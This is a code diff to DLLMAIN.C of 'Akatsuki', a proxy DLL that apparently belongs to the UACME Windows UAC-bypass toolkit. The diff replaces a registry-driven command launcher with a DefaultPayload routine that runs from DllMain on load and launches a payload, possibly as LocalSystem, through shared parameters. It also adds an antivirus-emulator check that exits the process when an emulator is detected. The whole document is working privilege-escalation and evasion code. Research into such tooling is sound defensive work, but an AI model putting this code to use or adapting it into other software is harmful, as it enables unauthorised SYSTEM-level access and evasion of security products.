@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2017
+*  (C) COPYRIGHT AUTHORS, 2016 - 2018
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.70
+*  VERSION:     3.10
 *
-*  DATE:        22 Mar 2017
+*  DATE:        18 Nov 2018
 *
 *  Proxy dll entry point, Akatsuki.
 *  Special dll for wow64 logger method.
@@ -23,29 +23,15 @@
 #error ANSI build is not supported
 #endif
 
-//disable nonmeaningful warnings.
-#pragma warning(disable: 4005) // macro redefinition
-#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
-#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
-#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
-#pragma warning(disable: 6102) // Using %s from failed function call at line %u
+#include "shared\shared.h"
+#include "shared\libinc.h"
 
-#include <windows.h>
-#include "shared\ntos.h"
-#include <ntstatus.h>
-#include "shared\minirtl.h"
+#define LoadedMsg      TEXT("Akatsuki lock and loaded")
 
-#if (_MSC_VER >= 1900) 
-#ifdef _DEBUG
-#pragma comment(lib, "vcruntimed.lib")
-#pragma comment(lib, "ucrtd.lib")
-#else
-#pragma comment(lib, "libvcruntime.lib")
-#endif
-#endif
+HANDLE g_SyncMutant = NULL;
 
-#define T_AKAGI_KEY    L"\\Software\\Akagi"
-#define T_AKAGI_PARAM  L"LoveLetter"
+UACME_PARAM_BLOCK g_SharedParams;
+
 
 /*
 * DummyFunc
@@ -63,161 +49,103 @@ VOID WINAPI DummyFunc(
 }
 
 /*
-* ucmQueryCustomParameter
+* DbgDumpRuntimeInfo
 *
 * Purpose:
 *
-* Query custom parameter and run it.
+* Dump runtime info to the file, this routine is only for debug builds.
 *
 */
-BOOL ucmQueryCustomParameter(
-    VOID
-)
+VOID DbgDumpRuntimeInfo()
 {
-    BOOL                    cond = FALSE, bResult = FALSE;
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    WCHAR szReportName[MAX_PATH * 2];
+    WCHAR sysdir[MAX_PATH + 1];
 
-    OBJECT_ATTRIBUTES               obja;
-    UNICODE_STRING                  usKey;
-    NTSTATUS                        status;
-    KEY_VALUE_PARTIAL_INFORMATION	keyinfo;
+    DWORD cch;
+    LPWSTR lpText = NULL;
 
-    SIZE_T                  memIO;
-    HKEY                    hKey = NULL;
-    PVOID                   ProcessHeap = NtCurrentPeb()->ProcessHeap;
-    LPWSTR                  lpData = NULL, lpParameter = NULL, lpszParamKey = NULL;
-    STARTUPINFOW            startupInfo;
-    PROCESS_INFORMATION     processInfo;
-    ULONG                   bytesIO = 0L;
+    DWORD bytesIO;
+    WCHAR ch;
 
-    do {
+    cch = ucmExpandEnvironmentStrings(L"%temp%\\", sysdir, MAX_PATH);
+    if ((cch != 0) && (cch < MAX_PATH)) {
+        _strcpy(szReportName, sysdir);
+        _strcat(szReportName, TEXT("report_"));
+        ultostr(GetCurrentProcessId(), _strend(szReportName));
+        _strcat(szReportName, TEXT(".txt"));
 
-        RtlSecureZeroMemory(&usKey, sizeof(usKey));
-        status = RtlFormatCurrentUserKeyPath(&usKey);
-        if (!NT_SUCCESS(status)) {
-            break;
-        }
+        hFile = CreateFile(szReportName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
 
-        memIO = (_strlen_w(T_AKAGI_KEY) * sizeof(WCHAR)) +
-            usKey.MaximumLength + sizeof(UNICODE_NULL);
+            ch = (WCHAR)0xFEFF;
+            WriteFile(hFile, &ch, sizeof(WCHAR), &bytesIO, NULL);
 
-        lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
-        if (lpszParamKey == NULL) {
-            RtlFreeUnicodeString(&usKey);
-            break;
-        }
-
-        _strcpy_w(lpszParamKey, usKey.Buffer);
-        _strcat_w(lpszParamKey, T_AKAGI_KEY);
-        RtlFreeUnicodeString(&usKey);
-
-        RtlSecureZeroMemory(&usKey, sizeof(usKey));
-        RtlInitUnicodeString(&usKey, lpszParamKey);
-        InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
-        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
-        if (!NT_SUCCESS(status)) {
-            break;
-        }
-
-        RtlInitUnicodeString(&usKey, T_AKAGI_PARAM);
-        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, &keyinfo,
-            sizeof(KEY_VALUE_PARTIAL_INFORMATION), &bytesIO);
-
-        if ((status != STATUS_SUCCESS) &&
-            (status != STATUS_BUFFER_TOO_SMALL) &&
-            (status != STATUS_BUFFER_OVERFLOW))
-        {
-            break;
-        }
-
-        lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, bytesIO);
-        if (lpData == NULL) {
-            break;
-        }
-
-        status = NtQueryValueKey(hKey, &usKey, KeyValuePartialInformation, lpData, bytesIO, &bytesIO);
-        NtDeleteKey(hKey);
-        NtClose(hKey);
-        hKey = NULL;
-
-        lpParameter = (LPWSTR)((PKEY_VALUE_PARTIAL_INFORMATION)lpData)->Data;
-        if (lpParameter != NULL) { //-V547
-            DbgPrint("Akagi letter found: %ws", lpParameter);
-
-            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
-            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
-            startupInfo.cb = sizeof(startupInfo);
-            GetStartupInfoW(&startupInfo);
-
-            bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
-                NULL, &startupInfo, &processInfo);
-
-            if (bResult) {
-                CloseHandle(processInfo.hProcess);
-                CloseHandle(processInfo.hThread);
+            lpText = ucmQueryRuntimeInfo(TRUE);
+            if (lpText) {
+                WriteFile(hFile, lpText, (DWORD)(_strlen(lpText) * sizeof(WCHAR)), &bytesIO, NULL);
+                ucmDestroyRuntimeInfo(lpText);
             }
-
+            CloseHandle(hFile);
         }
-
-        RtlFreeHeap(ProcessHeap, 0, lpData);
-
-    } while (cond);
-
-    if (hKey != NULL) {
-        NtDeleteKey(hKey);
-        NtClose(hKey);
     }
-    if (lpszParamKey != NULL) {
-        RtlFreeHeap(ProcessHeap, 0, lpszParamKey);
-    }
-
-    return bResult;
 }
 
 /*
-* ucmExpandEnvironmentStrings
+* DefaultPayload
 *
 * Purpose:
 *
-* Reimplemented ExpandEnvironmetStrings to minimize kernel32 import.
+* Process parameter if exist or start cmd.exe and exit immediatelly.
 *
 */
-DWORD ucmExpandEnvironmentStrings(
-    LPCWSTR lpSrc,
-    LPWSTR lpDst,
-    DWORD nSize
+VOID DefaultPayload(
+    VOID
 )
 {
-    NTSTATUS Status;
-    UNICODE_STRING Source, Destination;
-    ULONG Length;
-    DWORD iSize;
+    BOOL bSharedParamsReadOk;
+    UINT ExitCode;
+    PWSTR lpParameter;
+    ULONG cbParameter;
 
-    if (nSize > (MAXUSHORT >> 1) - 2) {
-        iSize = (MAXUSHORT >> 1) - 2;
+    BOOL bIsLocalSystem = FALSE;
+    ULONG SessionId;
+
+    if (ucmCreateSyncMutant(&g_SyncMutant) == STATUS_OBJECT_NAME_COLLISION)
+        ExitProcess(0);
+
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
+        SessionId = g_SharedParams.SessionId;
     }
     else {
-        iSize = nSize;
+        lpParameter = NULL;
+        cbParameter = 0UL;
+        SessionId = 0;
     }
 
-    RtlSecureZeroMemory(&Source, sizeof(Source));
-    RtlInitUnicodeString(&Source, lpSrc);
-    Destination.Buffer = lpDst;
-    Destination.Length = 0;
-    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
-    Length = 0;
-    Status = RtlExpandEnvironmentStrings_U(NULL,
-        &Source,
-        &Destination,
-        &Length
-    );
-    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
-        return(Length / sizeof(WCHAR));
+    ucmIsLocalSystem(&bIsLocalSystem);
+
+    ExitCode = (ucmLaunchPayload2(
+        bIsLocalSystem, 
+        SessionId, 
+        lpParameter, 
+        cbParameter) == TRUE);
+
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmSetCompletion(g_SharedParams.szSignalObject);
     }
-    else {
-        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
-        return 0;
-    }
+
+    ExitProcess(ExitCode);
 }
 
 /*
@@ -225,7 +153,7 @@ DWORD ucmExpandEnvironmentStrings(
 *
 * Purpose:
 *
-* Proxy dll entry point, process parameter if exist or start cmd.exe and exit immediatelly.
+* Proxy dll entry point.
 *
 */
 BOOL WINAPI DllMain(
@@ -234,41 +162,16 @@ BOOL WINAPI DllMain(
     _In_ LPVOID lpvReserved
 )
 {
-    DWORD                   cch;
-    TCHAR                   cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
-    STARTUPINFO             startupInfo;
-    PROCESS_INFORMATION     processInfo;
-
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
+    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
+        ExitProcess('Foff');
+
     if (fdwReason == DLL_PROCESS_ATTACH) {
-
-        OutputDebugString(TEXT("Hello, Admiral"));
-
-        if (!ucmQueryCustomParameter()) {
-
-            RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
-            RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
-            startupInfo.cb = sizeof(startupInfo);
-            GetStartupInfoW(&startupInfo);
-
-            RtlSecureZeroMemory(sysdir, sizeof(sysdir));
-            cch = ucmExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
-            if ((cch != 0) && (cch < MAX_PATH)) {
-                RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
-                _strcpy(cmdbuf, sysdir);
-                _strcat(cmdbuf, TEXT("cmd.exe"));
-
-                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
-                    sysdir, &startupInfo, &processInfo))
-                {
-                    CloseHandle(processInfo.hProcess);
-                    CloseHandle(processInfo.hThread);
-                }
-            }
-
-        }
+        OutputDebugString(LoadedMsg);
+        //DbgDumpRuntimeInfo();
+        DefaultPayload();
     }
     return TRUE;
 }
